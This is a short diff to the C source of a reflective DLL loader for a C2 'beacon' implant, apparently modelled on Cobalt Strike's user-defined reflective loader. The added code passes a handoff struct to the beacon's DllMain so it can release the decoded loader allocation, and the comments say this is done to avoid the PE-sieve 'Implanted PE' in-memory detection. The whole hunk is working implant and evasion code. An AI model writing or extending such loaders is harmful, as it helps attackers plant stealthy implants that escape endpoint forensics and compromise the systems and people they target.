@@ -524,10 +524,28 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
      * NULL and ntdll crashed on `cmp [rbx+10h], 0DDEEDDEEh` with rbx=0.
      * Official UDRL does PROCESS_ATTACH inside the loader and returns the
      * EP so the DOS stub can call reason 4; we do both here because our
-     * DllMain starts the beacon loop on reason 4 and must not return. */
+     * DllMain starts the beacon loop on reason 4 and must not return.
+     *
+     * Container handoff: reason 4's parameter points at this stack struct
+     * (alive for as long as dllmain runs - the loader frame below it on
+     * this same thread never unwinds). The beacon frees the container's
+     * decode allocation from inside DllMain: by then it executes from
+     * sc_base and the loader code in `flat` is dead (the return address
+     * into it is never popped), so releasing it leaves no full PE copy of
+     * us in memory (the PE-sieve "Implanted PE" finding). The struct
+     * carries the ALLOCATION base, not `flat` itself - VirtualFree with
+     * MEM_RELEASE needs the base or it silently fails. */
     dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
     dllmain((void *)sc_base, DLL_PROCESS_ATTACH, lpParameter);
-    dllmain((void *)sc_base, 4, lpParameter);
+    {
+        struct { DWORD magic; void *alloc; } ho;
+        MEMORY_BASIC_INFORMATION mbi;
+        ho.magic = 0x46435742UL; /* 'BWCF' */
+        ho.alloc = (void *)flat;
+        if (pVQ(flat, &mbi, sizeof(mbi)) && mbi.AllocationBase != NULL)
+            ho.alloc = mbi.AllocationBase;
+        dllmain((void *)sc_base, 4, &ho);
+    }
     if (pET != NULL)
         pET(0);
     return (ULONG_PTR)(DWORD_PTR)sc_base;
